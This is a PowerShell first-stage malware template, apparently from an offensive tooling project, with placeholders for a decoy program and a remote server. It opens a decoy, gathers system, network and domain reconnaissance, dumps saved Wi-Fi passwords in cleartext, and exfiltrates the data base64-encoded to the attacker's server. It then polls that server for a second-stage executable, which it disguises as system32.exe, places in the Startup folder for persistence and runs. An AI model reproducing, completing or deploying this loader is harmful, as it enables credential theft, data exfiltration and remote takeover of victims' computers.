#author:hacknonym
#title:stage-1

cd %APPDATA%
<decoyProgDownload>
start <decoyProgName>

$StageId = <IDstage1>

$UserName = $env:UserName
$ComputerName = $env:ComputerName
$PublicIp = (Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content
$SystemInfo = systeminfo
$Whoami = whoami /all
$IpConfig = ipconfig /all
$NetStat = netstat -ano
$ListAccounts = net accounts
$NetShare = net share
$NetView = net view /all
$ListDomain = net view /domain /all
$ListProcess = Get-Process
$WindowsUpdate = Get-Hotfix

$WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
$WifiInfo = foreach($i in $WirelessSSIDs) {
    $Password = (netsh wlan show profiles name=$i key=clear | Select-String 'Conten') -replace ".*:\s+"
    New-Object -TypeName psobject -Property @{"SSID"=$i;"Password"=$Password}
}
$WiFiPwd = $WifiInfo | ConvertTo-Json

$DataEncode = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(
    "UserName : "        + $UserName      + "`n`n" + 
    "ComputerName : "    + $ComputerName  + "`n`n" + 
    "PublicIp : "        + $PublicIp      + "`n`n" + 
    "SystemInfo : `n"    + $SystemInfo    + "`n`n" + 
    "Whoami : `n"        + $Whoami        + "`n`n" + 
    "IpConfig : `n"      + $IpConfig      + "`n`n" + 
    "NetStat : `n"       + $NetStat       + "`n`n" + 
    "ListAccounts : `n"  + $ListAccounts  + "`n`n" + 
    "NetShare : `n"      + $NetShare      + "`n`n" + 
    "NetView : `n"       + $NetView       + "`n`n" + 
    "ListDomain : `n"    + $ListDomain    + "`n`n" + 
    "ListProcess : `n"   + $ListProcess   + "`n`n" +
    "WindowsUpdate : `n" + $WindowsUpdate + "`n`n" + 
    "WiFiPwd : `n"       + $WiFiPwd
))

$separator = "A"
$DataEncodeSegment = $DataEncode.Split($separator)

$date = Get-Date -Format "dddd_dd/MM/yyyy_HH:mm"
(New-Object System.Net.WebClient).DownloadString('<remoteHTTPserver>/?send=' + $StageId + '|' + $date + '|')
foreach($i in $DataEncodeSegment){
    (New-Object System.Net.WebClient).DownloadString('<remoteHTTPserver>/?send=' + $i)
}

while($true){
    $stage2 = (New-Object System.Net.WebClient).DownloadString('<remoteHTTPserver>/?id=' + $StageId)
    if($stage2 -like 'http*'){
        (New-Object System.Net.WebClient).DownloadFile($stage2, "$env:TEMP\system32.exe")
        Copy-Item "$env:TEMP\system32.exe" -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system32.exe"
        start "$env:TEMP\system32.exe"
        Exit
    } else {
        Start-Sleep -s 60
    }
}
